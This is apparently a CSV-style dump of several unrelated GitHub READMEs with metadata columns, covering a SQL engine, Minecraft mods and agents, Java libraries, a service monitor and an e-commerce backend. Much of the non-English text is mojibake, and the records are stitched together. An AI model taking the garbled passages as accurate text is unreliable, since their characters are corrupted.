- ÂäüËÉΩÁâπÊÄß5ÔºöÊîØÊåÅ‰∏∞ÂØåÁöÑÊï∞ÊçÆÁ±ªÂûãÔºö`INT`, `BIGINT`, `NUMBER`, `VARCHAR`, `DATE`, `TIMESTAMP` Á≠âÔºõ
- ÂäüËÉΩÁâπÊÄß6ÔºöÊîØÊåÅËøáÁ®ãÂáΩÊï∞Êï¥ÂêàSQL-UDFÔºöÂú®ËøáÁ®ãËØ≠Ë®Ä‰∏≠ÂÆö‰πâÁöÑ`CREATE FUNCTION`ÂèØ‰ª•Áõ¥Êé•Âú®SQL‰∏≠‰ΩøÁî®ÔºåÂπ∂ÊîØÊåÅÂ§öÁßçÊï∞ÊçÆÁ±ªÂûãÔºõ

## ËØ≠Ê≥ïÁ§∫‰æã

### ËØ≠Ê≥ïÁ§∫‰æã1

```sql
SET datasource.mytest.connector=mysql;
SET datasource.mytest.url=jdbc:mysql://127.0.0.1:3306/mytest?useSSL=false;
SET datasource.mytest.driver=com.mysql.cj.jdbc.Driver;
SET datasource.mytest.user=root;
SET datasource.mytest.password=123456;

CREATE TABLE test1
WITH (
    'datasource' = 'mytest',
    -- 'query'='select * from t_user',
    'table_name'='t_user',
    'type' = 'source,sink'
);

CREATE TABLE test2
WITH (
    'datasource' = 'mytest',
    'table_name'='t_user1',
    'type' = 'source,sink'
);

SELECT * FROM test1 LIMIT 20;

TRUNCATE TABLE test2;

INSERT INTO test2 (id, name, c_time) SELECT id, name, c_time FROM test1 WHERE id > 0 LIMIT 100;

UPDATE test2 a, test1 b SET a.name = b.name||'_', a.c_time = to_timestamp(date_add(b.c_time, 1)||' '||date_format(b.c_time, 'HH:mm:ss')) WHERE a.id = b.id;

DELETE FROM test2 a, (SELECT * FROM test1 WHERE id>3) b WHERE a.id = b.id;

MERGE INTO test2 tu2
USING (SELECT * FROM test1) tu
ON (tu2.id=tu.id)
WHEN NOT MATCHED THEN
    INSERT (tu2.id, tu2.name, tu2.c_time)
        VALUES (tu.id, tu.name, tu.c_time)
WHEN MATCHED THEN
    UPDATE SET tu2.name = tu.name, tu2.c_time = tu.c_time;

DECLARE
    cnt INT := 0;
BEGIN
    SELECT COUNT(*) INTO :cnt FROM test1;
    PUT_LINE('Total records: '||:cnt);
END;
```

### ËØ≠Ê≥ïÁ§∫‰æã2

```sql
CREATE FUNCTION test(num INT) RETURN INT AS
BEGIN
    RETURN num + 1;
END;

PUT_LINE(test(-1));

SELECT test(10) as test;
```
### ËØ≠Ê≥ïÁ§∫‰æã3

```sql
CREATE PROCEDURE test(p1 IN INT, p2 IN NUMBER) AS
    a VARCHAR := 'test';
    b INT := 1;
    c TIMESTAMP := '2021-01-01 12:23:34.567';
    d NUMBER(10, 2) := 1.124;
BEGIN
    PUT_LINE(d);
    WHILE b <= p1 LOOP
        PUT_LINE('Current index: '||b);
        IF b > 2 THEN
            PUT_LINE('Exit while loop!');
            EXIT;
        END IF;
        b := b + 1;
    END LOOP;
END;

CALL test(5, 3.14);


CREATE PROCEDURE test2(p1 IN INT, p2 IN NUMBER, p3 OUT VARCHAR) AS
BEGIN
    p3 := (p1 * p2) || '_';
END;

DECLARE
    v1 VARCHAR;
BEGIN
    test2(2, 3.14, v1);
    put_line('Result: '||v1);
END;
```

### ËØ≠Ê≥ïÁ§∫‰æã4

```sql
CREATE TABLE test1
WITH (
    'connector' = 'fake',
    'schema' = '{""fields"":{""id"":""bigint"",""name"":""string"",""c_time"":""timestamp""}}',
    'rows' = '[{""fields"":[1, ""Eric"", ""2021-01-01 12:23:34""]},
               {""fields"":[2, ""Andy"", ""2022-03-11 11:23:34""]},
               {""fields"":[3, ""Joker"", ""2024-11-04 10:23:34""]}]',
    'type' = 'source'
);

DECLARE
    i INT := 0;
    e INT := 5;
BEGIN
    WHILE i < 5 LOOP
        IF i > 2 THEN
            EXIT;
        END IF;
        PUT_LINE('INDEX: ' || i);
        i := i + 1;
    END LOOP;

    FOR j IN 1..e LOOP
        IF j = 3 THEN
            EXIT;
        END IF;
        PUT_LINE('INDEX: ' || j);
    END LOOP;

    FOR cur IN (select * from test1) LOOP
        println(cur.id||' '||cur.name||' '||cur.c_time);
    END LOOP;
END;
```

## ÊâßË°åÁ§∫‰æã

Local:
``` bash
./bin/ares-local-starter.sh --sql /path/to/sample.sql 
``` 

Spark3:
``` bash
./bin/start-ares-spark3-connector.sh --sql /path/to/sample.sql --master spark://127.0.0.1:7077 
``` 

Spark2:
``` bash
./bin/start-ares-spark2-connector.sh --sql /path/to/sample.sql --master spark://127.0.0.1:7077 
``` ",0,0,4,,1,3.0,0.0,1.0,1.0,3.0,0.0,-0.4,40.0
AxalotLDev/Async,ver/1.21.4,"[![Issues](https://img.shields.io/github/issues/AxalotLDev/Async?style=for-the-badge)](https://github.com/AxalotLDev/Async/issues)
<img width=""100"" src=""https://github.com/AxalotLDev/Async/raw/ver/1.21.1/src/main/resources/assets/async/icon.png"" alt=""Async icon"" align=""right"">
<div align=""left"">
<h1>Async - Minecraft Entity Multi-Threading Mod</h1>
<h3>Async is a Fabric mod designed to improve entity performance by processing them in parallel using multiple CPU cores and threads.</h3>
</div>

## Important‚ùó

Async is currently in alpha testing and is experimental. Its use may lead to incorrect entity behavior and crashes.

## What is Async? ü§î

Async is a Fabric mod that enhances the performance of entity processing. The mod leverages multithreading, which allows multiple CPU cores to improve performance when handling a large number of entities.

### üí° Key Benefits:

- ‚ö° **Improved TPS**: Maintains stable tick times even with a large number of entities.
- üöÄ **Multithreading**: Utilizes multiple CPU cores for parallel entity processing.

### üìä Performance Comparison (9000 Villagers)

| Configuration           | TPS  | MSPT   |
| ----------------------- | ---- | ------ |
| **Lithium + Async**     | 20   | 41.8   |
| **Lithium (without Async)** | 4.4  | 225.4  |
| **Purpur**              | 5.72 | 176.18 |

### üõ†Ô∏è Test Configuration

- **Processor**: AMD Ryzen 9 7950X3D
- **RAM**: 64 GB (16 GB allocated to the server)
- **Minecraft Version**: 1.21.4
- **Number of Entities**: 9000
- **Entity Type**: Villagers

<details>
<summary>Mod List</summary>

Concurrent Chunk Management Engine, Fabric API, FerriteCore, Lithium, ScalableLux, ServerCore, StackDeobfuscator, TT20 (TPS Fixer), Tectonic, Very Many Players, Fabric Carpet.

</details>

## üîß Commands
- `/async config toggle` ‚Äî Enables or disables the mod in-game (no server restart required). Use this command to instantly see how Async improves your server.
- `/async config setEntityMoveSync` ‚Äî Disables parallel processing of entity movement. Useful for preventing potential desynchronization with vanilla logic (disabled by default). Always enabled for items.
- `/async config synchronizedEntities add` ‚Äî Adds selected entity to synchronized processing.
- `/async config synchronizedEntities remove` ‚Äî Removes selected entity from synchronized processing.
- `/async stats` ‚Äî Displays the number of threads in use.
- `/async stats entity` ‚Äî Shows the number of entities processed by Async in various worlds.

## üì• Download

The mod is available on [Modrinth](https://modrinth.com/mod/async)

## üîÑ Minecraft Version Support

Full support is provided only for the latest version of Minecraft. Older versions receive critical fixes only. Support for older Minecraft snapshots is not planned.

## üì≠ Feedback

Our tracker for feedback and bug reports is available on GitHub:
[![Report issues on GitHub](https://img.shields.io/badge/Report%20issues%20on-GitHub-lightgrey)](https://github.com/AxalotLDev/Async/issues)

You can also chat with us on Discord:
[![Chat with us on Discord](https://img.shields.io/badge/Chat%20with%20us%20on-Discord-blue)](https://discord.com/invite/scvCQ2qKS3)

## üôå Acknowledgements

This mod is based on code from [MCMTFabric](https://modrinth.com/mod/mcmtfabric), which in turn was based on [JMT-MCMT](https://github.com/jediminer543/JMT-MCMT). Huge thanks to Grider and jediminer543 for their invaluable contributions!
",13,6,8,GPL-3.0,1,2.0,0.0,1.0,1.0,7.0,0.0,-1.4,0.0
quarkiverse/quarkus-infinispan-embedded,main,"# Quarkus Infinispan Embedded

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.infinispan/quarkus-infinispan-embedded?logo=apache-maven&style=for-the-badge)](https://search.maven.org/artifact/io.quarkiverse.infinispan/quarkus-infinispan-embedded)
[![License](https://img.shields.io/github/license/infinispan/infinispan?style=for-the-badge&logo=apache)](https://www.apache.org/licenses/LICENSE-2.0)
![Supported JVM Versions](https://img.shields.io/badge/JVM-17--23-brightgreen.svg?style=for-the-badge&logo=openjdk)
[![Project Chat](https://img.shields.io/badge/zulip-join_chat-pink.svg?style=for-the-badge&logo=zulip)](https://infinispan.zulipchat.com/)
[![All Contributors](https://img.shields.io/badge/all_contributors-1-orange.svg?style=for-the-badge&logo=github)](#contributors-)

This repository contains Quarkus extensions that facilitate seamless integration between Quarkus and [Infinispan Embedded](https://infinispan.org/) (library mode).

## Documentation

Refer to the comprehensive [documentation](https://docs.quarkiverse.io/quarkus-infinispan-embedded/dev) for detailed information and usage guidelines.

## Samples

Check out the [sample](https://github.com/quarkiverse/quarkus-infinispan-embedded/tree/main/sample).

## Getting Started

To incorporate Quarkus Infinispan Embedded into your Quarkus project, add the following Maven dependency:

```xml
<dependency>
    <groupId>io.quarkiverse.infinispan</groupId>
    <artifactId>quarkus-infinispan-embedded</artifactId>
    <version>1.0.1</version>
</dependency>
```

## Contributing

Feel free to contribute to this project by submitting issues or pull requests.

## License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.


## Contributors ‚ú®

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/wburns""><img src=""https://avatars.githubusercontent.com/u/648175?v=4?s=100"" width=""100px;"" height=""100px;"" alt=""Will Burns""/><br /><sub><b>Will Burns</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-infinispan-embedded/commits?author=wburns"" title=""Code"">üíª</a> <a href=""#maintenance-wburns"" title=""Maintenance"">üöß</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/ryanemerson""><img src=""https://avatars.githubusercontent.com/u/765332?v=4?s=100"" width=""100px;"" height=""100px;"" alt=""Ryan Emerson""/><br /><sub><b>Ryan Emerson</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-infinispan-embedded/commits?author=ryanemerson"" title=""Code"">üíª</a> <a href=""#maintenance-ryanemerson"" title=""Maintenance"">üöß</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/karesti""><img src=""https://avatars.githubusercontent.com/u/233499?v=4?s=100"" width=""100px;"" height=""100px;"" alt=""Katia Aresti""/><br /><sub><b>Katia Aresti</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-infinispan-embedded/commits?author=karesti"" title=""Code"">üíª</a> <a href=""#maintenance-karesti"" title=""Maintenance"">üöß</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!",2,9,1,Apache-2.0,5,11.0,1.0,5.0,1.0,5.0,1.0,-3.2,12.0
JesusMiramontes/Heartbeatrr,main,"# Heartbeatrr Project - README

## Project Overview

Heartbeatrr is an easy-to-use service monitoring tool that helps you keep track of the health of your online services. Imagine you have a few websites, applications, or online services that you rely on, and you want to know if any of them go offline or experience issues. Heartbeatrr checks these services regularly and lets you know if something goes wrong.

### Here‚Äôs how it works:

1.	Service Health Monitoring: Heartbeatrr periodically checks the status of different services by ‚Äúpinging‚Äù their URLs to see if they are responding. These services could be websites, APIs, or any other online system that provides a URL for checking availability.
2.	Automatic Alerts: If any of the services fail to respond or return an error, Heartbeatrr immediately sends a notification to your Discord channel. This way, you are promptly informed if something goes wrong without having to manually check everything.
3.	Configurable Timing: You can decide how often you want Heartbeatrr to check the services. For example, it could check them every 30 minutes, every hour, or at any interval that fits your needs. This is done through simple settings that are easy to adjust.
4.	Retry on Failure: Sometimes, services might be temporarily unavailable due to brief issues. Instead of notifying you immediately for every small hiccup, Heartbeatrr can retry the failed services a few times before sending an alert, just to make sure it‚Äôs not a short-term glitch.
5.	Customizable for Your Needs: You can easily tell Heartbeatrr which services to monitor by providing their URLs. It‚Äôs as simple as giving the app a list of web addresses, and it takes care of the rest.

## Who is it for?

Heartbeatrr is ideal for anyone who manages online services and wants to make sure everything is running smoothly without constantly checking manually. Whether you‚Äôre managing a few websites, APIs, or internal tools, Heartbeatrr gives you peace of mind by automatically checking the status of these services and notifying you of any issues.

This app is also great for those who use platforms like Discord for team communication. Instead of getting notifications via email or other channels, you‚Äôll receive real-time alerts directly in your Discord chat, where you can quickly take action.

This simple yet powerful tool automates the health-checking process and keeps you informed, making it an essential part of your service management toolkit.

## Features
	- Periodic health checks for multiple services.
	- Configurable retries for failed health checks.
	- Sends alerts via Discord webhook when a service goes down.
	- Easily deployable using Docker.

## Docker Configuration
The project can be easily deployed using Docker. You need to configure the Docker environment variables to suit your needs. Here‚Äôs a breakdown of the variables you need to configure.

### Environment Variables

	- HEARTBEATRR_CONNECTION_TIMEOUT: Sets the HTTP connection timeout (in milliseconds). This determines how long the system waits for a service to respond before timing out. Example: 3000 (3 seconds).
	- HEARTBEATRR_RETRY_BACKOFF_DELAY: The delay (in milliseconds) between retry attempts when a health check fails. Example: 1000 (1 second).
	- HEARTBEATRR_RETRY_MAX_ATTEMPTS: Sets the maximum number of retry attempts for failed health checks. Example: 3.
	- HEARTBEATRR_HEALTHCHECK_SCHEDULE_DELAY: Delay between scheduled health checks (in seconds). This is how often the system will check the health of services. Example: 1800 (30 minutes).
	- HEARTBEATRR_SERVICES_URLS: A JSON-like object specifying the services to be checked and their URLs. For example: {""Google"":""http://google.com"", ""Yahoo"":""http://yahoo.com""}.
	- HEARTBEATRR_DISCORD_SERVICE_WEBHOOK: The Discord webhook URL to send notifications when services are down. This is required if you want to receive alerts.

## Steps to Run with Docker
1. Configure the docker-compose.yml file with the required services, retries, and Discord webhook.
2. Run the application with Docker Compose:
```bash
docker-compose up -d
```
3. The application will now start running and periodically check the services you‚Äôve configured. If any service is down, you‚Äôll receive a Discord notification.


## For Developers
This section is for developers who want to modify the code, run tests, or contribute to the project.

### Project Structure

The project follows a standard Spring Boot structure:

	‚Ä¢ src/main/java: Contains the application source code.
	‚Ä¢ src/main/resources: Contains application configuration files.
	‚Ä¢ src/test/java: Contains unit and integration tests.

### Building the Project
Make sure you have Maven installed. To build the project:

### Contributing

We welcome contributions to the project! Here‚Äôs how you can contribute:

	1. Fork the repository.
	2. Create a new branch with a descriptive name (git checkout -b feature-branch-name).
	3. Make your changes and test them.
	4. Push your changes to the branch (git push origin feature-branch-name).
	5. Open a Pull Request and describe your changes.

Be sure to follow our coding standards and add proper documentation for any new features.

That‚Äôs it! If you have any questions, feel free to open an issue or reach out for support. Happy monitoring!",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
mcbrawls/inject,master,"# inject
Inject is a simple server-side library to allow developers to inject into Netty easier.

## Example
This uses the `HttpInjector` class to respond to HTTP requests to the Minecraft
server.

```java
class MyEpicHttpInjector extends HttpInjector {
    @Override
    public HttpByteBuf intercept(ChannelHandlerContext ctx, HttpRequest request) {
        HttpByteBuf buf = HttpByteBuf.httpBuf(ctx);
        buf.writeStatusLine(""1.1"", 200, ""OK"");
        buf.writeText(""Hello, from Minecraft!"");
        return buf;
    }
}
```

## Registration
For Fabric, use the `InjectFabric` class:
```java
public class MyMod implements ModInitializer {
    @Override
    public void onInitialize() {
        InjectFabric.INSTANCE.registerInjector(new MyEpicHttpInjector());
    }
}
```

For Spigot, Paper and derivatives, use the `InjectSpigot` class:
```java
public class MyPlugin extends JavaPlugin {
    @Override
    public void onEnable() {
        InjectSpigot.INSTANCE.registerInjector(new MyEpicHttpInjector());
    }
}
```

This will register an HTTP injector which will respond with `Hello, from Minecraft!`
to any HTTP request to the Minecraft port.

```bash
$ curl http://localhost:25565
Hello, from Minecraft!
```

## Supported web servers
- Spring Boot: `spring` module
- Javalin: `javalin` module
- Ktor: `ktor` module
- Jetty: `jetty` module
- manual request handling: `http` module

Examples can be found in the `examples` module.

## Usage
Add the andante repo to gradle:
```kt
repositories {
    maven(""https://maven.andante.dev/releases/"")
}
```

Add the dependency:
```kt
dependencies {
    implementation(""net.mcbrawls.inject:api:VERSION"")
 
    // HTTP-related things:
    implementation(""net.mcbrawls.inject:http:VERSION"")

    // Fabric:
    include(modImplementation(""net.mcbrawls.inject:fabric:VERSION"")!!)
 
    // Spigot/Paper:
    implementation(""net.mcbrawls.inject:spigot:VERSION"")
}
```

Replace `VERSION` with the latest version from the releases tab.
",14,0,3,MIT,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
pivovarit/more-gatherers,main,"# more-gatherers

Missing Stream API functionality you always longed for - provided via `Gatherers`

[![build](https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml/badge.svg?branch=main)](https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml)
[![pitest](https://github.com/pivovarit/more-gatherers/actions/workflows/pitest.yml/badge.svg?branch=main)](https://pivovarit.github.io/more-gatherers)
![Maven Central Version](https://img.shields.io/maven-central/v/com.pivovarit/more-gatherers)

[![Stargazers over time](https://starchart.cc/pivovarit/more-gatherers.svg?variant=adaptive)](https://starchart.cc/pivovarit/more-gatherers)

## Project is under intense development and will be released alongside Java 24, when Stream Gatherers go GA (hopefully)

### Overview

Java's Stream API is a powerful tool for processing collections of data. However, it lacks some functionality that could make it even more powerful. This library aims to fill that gap by providing a set of `Gatherers` that can be used to collect data from a stream more flexibly.

Whenever possible, the library follows Project Reactor's naming conventions.

Provided `Gatherers`:
- `MoreGatherers.last(int)`
  - takes last `n` elements from the stream
- `MoreGatherers.sampling(int)`
  - takes every `n`-th element from the stream
- `MoreGatherers.zip(Iterator<T2>)`
  - zips `Stream` elements with elements from the provided `Iterator`
- `MoreGatherers.zip(Iterator<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Iterator` using a custom zipper function
- `MoreGatherers.zip(Stream<T2>)`
  - zips `Stream` elements with elements from the provided `Stream`
- `MoreGatherers.zip(Stream<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Stream` using a custom zipper function
- `MoreGatherers.zipWithIterable(Iterable<T2>)`
  - zips `Stream` elements with elements from the provided `Iterable`
- `MoreGatherers.zipWithIterable(Iterable<T2>, BiFunction<T1,T2>)`
  - zips elements with elements from the provided `Iterable` using a custom zipper function
- `MoreGatherers.zipWithIndex()`
  - zips `Stream` elements with their index
- `MoreGatherers.zipWithIndex(BiFunction<Long,T>)`
  - zips `Stream` elements with their index using a custom zipper function
- `MoreGatherers.distinctBy(Function<T, R>)`
  - takes distinct elements based on a key extractor function
- `MoreGatherers.distinctByKeepLast(Function<T, R>)`
  - takes distinct elements based on a key extractor function, keeping the last occurrence
- `MoreGatherers.distinctUntilChanged()`
  - takes elements until a change is detected
- `MoreGatherers.distinctUntilChanged(Function<T, R>)`
  - takes elements until a change is detected based on a key extractor function
- `MoreGatherers.windowSliding(int, int)`
  - creates a sliding window of a fixed size with a fixed step, extends `Gatherers.windowSliding(int)` by adding a step parameter
- `MoreGatherers.filteringByIndex(BiPredicate<Long, T>)`
  - filters elements based on their index and value
- `MoreGatherers.groupingBy(Function<T, K>, Collector<T, ?, R>)`
  - groups elements by a key extractor function and applies a custom collector

### Philosophy

The primary goal of this library is to complement the existing Stream API by providing functionality that's currently missing without duplicating features already available. While it is technically possible to create numerous custom Gatherers, this library focuses on offering only those that cannot be easily achieved using standard Stream API operations.

The library is designed to be as lightweight as possible, with no external dependencies. It's implemented using core Java libraries and follows the same conventions as the standard Stream API, drawing inspiration from Project Reactor's method names.
",0,0,4,Apache-2.0,4,65.0,1.0,5.0,1.0,11.0,0.0,-4.300000000000001,74.0
bowbahdoe/color,main,"# color

Color library for the JVM.

Heavily based on [go-colorful](https://github.com/lucasb-eyer/go-colorful/tree/master)
by [Lucas Beyer](https://github.com/lucasb-eyer).

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>color</artifactId>
    <version>2024.10.09.3</version>
</dependency>
```

## Status

I am still working through this and working toward actually understanding
colors, color spaces, etc.

As such I might revisit some design choices without mercy. Notably I need to zero in
on where and when is best to auto-clamp values in the different color implementations.

Keep that in mind if you want to use it for anything. You can always reach out
to me directly to make sure some particular piece of API surface is stable.

Other than that, I need to do a lot more documentation. Both javadocs and
tutorials for appropriate usage.

## Usage

You can create a color using one of the static factory methods on `Color`.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
```

And you can get the components of a color in a particular color space using matching instance methods.

```java
// RGB in 0..1
var srgb = Color.hex(""#00FF0F"").sRGB();
// RBG in 0..255
var rgb = Color.hex(""#00FF0F"").RGB255();
// HSL
var hsl = Color.hex(""#00FF0F"").HSL();
```

To blend between different colors you can use the various blend methods.
These are tailored to blending in a particular color space.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
var purple = red.blendLuv(blue);
```

There are also utilities for generating palettes of colors
and for sorting colors by their ""distance"" to each-other.

```java
var happy = Color.happy(10);
var sorted = Color.sort(happy);
```

",6,0,1,MIT,2,0.0,1.0,2.0,1.0,6.0,1.0,-1.8,32.0
CraftJarvis/ROCKET-1,main,"# ROCKET-1: Mastering Open-World Interaction with Visual-Temporal Context Prompting

[`Shaofei Cai`](https://phython96.github.io/) | [`Zihao Wang`](https://zhwang4ai.github.io/) | [`Kewei Lian`](https://kevin-lkw.github.io/) | [`Zhancun Mu`](https://zhancunmu.owlstown.net/) | [`Xiaojian Ma`](https://jeasinema.github.io/) | [`Anji Liu`](https://liuanji.github.io/) | [`Yitao Liang`](https://scholar.google.com/citations?user=KVzR1XEAAAAJ&hl=zh-CN&oi=ao)

All authors are affiliated with Team **[`CraftJarvis`](https://craftjarvis.github.io/)**. 

[[`Project`](https://craftjarvis.github.io/ROCKET-1/)] | [[`Paper`](https://arxiv.org/abs/2410.17856)] | [[`huggingface`](https://huggingface.co/papers/2410.17856)] | [[`Demo`](https://huggingface.co/spaces/phython96/ROCKET-1-DEMO)] | [[`BibTex`](#citig_rocket)] 

![](rocket/assets/teaser.png)


## Latest updates

- **01/06/2025 -- We have provided a new implementation through [MineStudio](https://github.com/CraftJarvis/MineStudio)! Please refer to this [document](https://craftjarvis.github.io/MineStudio/models/baseline-rocket1.html)!** 
- **11/03/2024 -- We have built a Hugging Face space for the online demo!**
- **11/02/2024 -- ROCKET-1 inference scripts are released!**

## Docker

```sh
docker run -it -p 7860:7860 --platform=linux/amd64 --gpus all \
	registry.hf.space/phython96-rocket-1-demo:latest 
```

## Installation

First, download the scripts and install dependencies. 

```sh

sudo apt-get install libghc-x11-dev gcc-multilib g++-multilib \
    libglew-dev libosmesa6-dev libgl1-mesa-glx libglfw3

git clone git@github.com:CraftJarvis/ROCKET-1.git
conda create -n rocket python=3.10
conda activate rocket
conda install --channel=conda-forge openjdk=8
# install ROCKET-1
cd ROCKET-1
pip install -e .
# install scripts for realtime segmentation
cd rocket/realtime_sam
pip install -e .
# download segment-anything-model checkpoints
cd checkpoints
bash download_ckpts.sh
```

Second, download the MCP-Reborn.zip from huggingface and check if the environment runs well. 

```sh
cd rocket/stark_tech
# download the simulator (Minecraft 1.16.5)
python -c ""from huggingface_hub import hf_hub_download;hf_hub_download(repo_id='phython96/ROCKET-MCP-Reborn', filename='MCP-Reborn.zip', local_dir='.')""
unzip MCP-Reborn.zip && rm MCP-Reborn.zip

# check if the simulator runs well
python env_interface.py
```

If you can see these logs, it means the simulator works well!
```
[Close-ended] Slow reset with world seed:  19961103
INFO: Starting Minecraft process with device: cpu
{'img': Box(0, 255, (224, 224, 3), uint8), 'text': <class 'str'>, 'obs_conf': typing.Dict}
Dict('buttons': MultiDiscrete([8641]), 'camera': MultiDiscrete([121]))
frame: 0, fps: 32.88, avg_fps: 32.88
frame: 50, fps: 28.52, avg_fps: 30.54
frame: 100, fps: 1.29, avg_fps: 29.70
...
```


## Usage
```python
from rocket.arm.models import ROCKET1
from rocket.stark_tech.env_interface import MinecraftWrapper

model = ROCKET1.from_pretrained(""phython96/ROCKET-1"").to(""cuda"")
memory = None
input = {
  ""img"": torch.rand(224, 224, 3, dtype=torch.uint8), 
  'segment': {
    'obj_id': torch.tensor(6),                              # specify the interaction type
    'obj_mask': torch.zeros(224, 224, dtype=torch.uint8),   # highlight the regions of interest
  }
}
agent_action, memory = model.get_action(input, memory, first=None, input_shape=""*"")
env_action = MinecraftWrapper.agent_action_to_env(agent_action)

# --------------------- the output --------------------- #
# agent_action = {'buttons': tensor([1], device='cuda:0'), 'camera': tensor([54], device='cuda:0')}
# env_action = {'attack': array(0), 'back': array(0), 'forward': array(0), 'jump': array(0), 'left': array(0), 'right': array(0), 'sneak': array(0), 'sprint': array(0), 'use': array(0), 'drop': array(0), 'inventory': array(0), 'hotbar.1': array(0), 'hotbar.2': array(0), 'hotbar.3': array(0), 'hotbar.4': array(0), 'hotbar.5': array(0), 'hotbar.6': array(0), 'hotbar.7': array(0), 'hotbar.8': array(0), 'hotbar.9': array(0), 'camera': array([-0.61539427, 10.        ])}
```

## Interaction Details

Here are some interaction types:
| interaction | obj_id | function | 
| --- | --- | --- |
| Hunt     | 0 | Approach the animals then kill it. | 
| Mine     | 2 | Approach and mine the target object. |
| Interact | 3 | Approach and right click the target object. | 
| Craft    | 4 | Move the cursor to the item and click on it. |
| Switch   | 5 | Highlight an item in the hotkey bar, then switch to holding state. | 
| Approach | 6 | Approach the target object. |

## Play ROCKET-1 with Gradio
Click the following picture to learn how to play ROCKET-1 with gradio. 
[![](rocket/assets/gradio.png)](https://www.youtube.com/embed/qXLWw81p-Y0)

```sh
cd rocket/arm
python eval_rocket.py --port 8110 --sam-path ""/path/to/sam2-ckpt-directory""
```


## Citing ROCKET-1
If you use ROCKET-1 in your research, please use the following BibTeX entry. 

```
@article{cai2024rocket,
  title={ROCKET-1: Master Open-World Interaction with Visual-Temporal Context Prompting},
  author={Cai, Shaofei and Wang, Zihao and Lian, Kewei and Mu, Zhancun and Ma, Xiaojian and Liu, Anji and Liang, Yitao},
  journal={arXiv preprint arXiv:2410.17856},
  year={2024}
}
```
",0,0,3,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
anonystick/JAVA-ecommerce-backend-api-MEMBER,main,"# Java E-commerce Backend - Open Source Project

## Overview

Welcome to the [Java E-commerce Backend open-source - shopdevjava.com](https://www.youtube.com/channel/UCky92hx0lZxVBi2BJ6Zm2Hg/join) project! This project aims to build a backend system for an e-commerce platform similar to Shopee (Version LITE). Our goal is to provide a robust, scalable, and flexible system to handle core e-commerce functionalities such as product management, orders, payments, inventory, etc.

This backend is developed in Java, utilizing modern frameworks and libraries, and follows best practices in software engineering. We encourage contributions and participation from the open-source community.

## How to Become a Contributor
If you are interested in contributing to this project, please follow the steps outlined in our contribution guidelines. We encourage all contributors to:
- Fork the repository. `https://github.com/anonystick/JAVA-ecommerce-backend-api-MEMBER.git`
- Create a feature branch.
- Commit your changes.
- Open a pull request for review.

The best approach is to follow this guide if you are new: [H∆∞·ªõng d·∫´n L·∫≠p Tr√¨nh Vi√™n tham gia PR v√†o c·ªông ƒë·ªìng OpenSource](https://www.youtube.com/watch?v=82oFC6cO5lg)

## Mind maps

### Project Architecture

1. Operating platform

![Project Architecture](./docs/images/0001-vanhanh.png)

2. Shop Management
![Shop Management](./docs/images/0002-shop-manager.png)

3. User Management
![User Management](./docs/images/0003-user-manager.png)

4. Product Management

![Product Management](./docs/images/0004-product.png)

## Features

FULL PLAYLIST: [PLAYLIST - Con ƒë∆∞·ªùng tr·ªü th√†nh L·∫¨P TR√åNH VI√äN BACKEND JAVA](https://www.youtube.com/playlist?list=PLw0w5s5b9NK5Trt3AIxCtpRHWR7nI0RyX)

- **User Management**
  - User Registration and Authentication
  - Password Management
  - Profile Management
  - Two-factor authentication (2FA)
  
- **Product Management**
  - Add, Update, Delete Products
  - Categories and Tags
  - Search and Filter Products
  - Reviews and Ratings

- **Order Management**
  - Create, Update, Cancel Orders
  - Order Tracking
  - Payment Integration (Stripe, PayPal, etc.)
  - Order Status Notifications

- **Cart and Wishlist**
  - Add to Cart
  - Manage Wishlist

- **Inventory Management**
  - Stock Levels per Product
  - Backorders and Inventory Tracking

- **Shipping and Delivery**
  - Integration with shipping services (FedEx, DHL, etc.)
  - Real-time Shipping Rates and Estimated Delivery Time
  - Order Dispatch and Delivery Tracking

- **Payments**
  - Support Multiple Payment Methods
  - Payment Gateway Integration (Stripe, PayPal, etc.)
  - Refunds and Returns
  
- **Admin Dashboard**
  - Manage Users, Products, Orders, and Reviews
  - Analytics for Sales, Revenue, and User Behavior
  
- **Notifications**
  - Email and SMS Notifications for Orders and Shipping
  - Push Notifications

## Technologies

- **Java 17**
- **Spring Boot** (for RESTful APIs)
- **Hibernate / JPA** (for ORM and database interaction)
- **MySQL / PostgreSQL** (for data storage)
- **Redis** (for caching and session management)
- **Kafka / RabbitMQ** (for messaging and event-driven architecture)
- **ElasticSearch** (for search and filtering products)
- **Swagger** (for API documentation)
- **Docker** (for containerization)
- **Junit** and **Mockito** (for testing)
- **OAuth 2.0** and **JWT** (for authentication and security)

## Project Structure MVC 

```bash
ecommerce-backend
‚îú‚îÄ‚îÄ src/main/java/com/anonystick/ecommerce
‚îÇ   ‚îú‚îÄ‚îÄ controller/            # REST API Controllers
‚îÇ   ‚îú‚îÄ‚îÄ service/               # Business Logic
‚îÇ   ‚îú‚îÄ‚îÄ model/                 # Data Models (Entities)
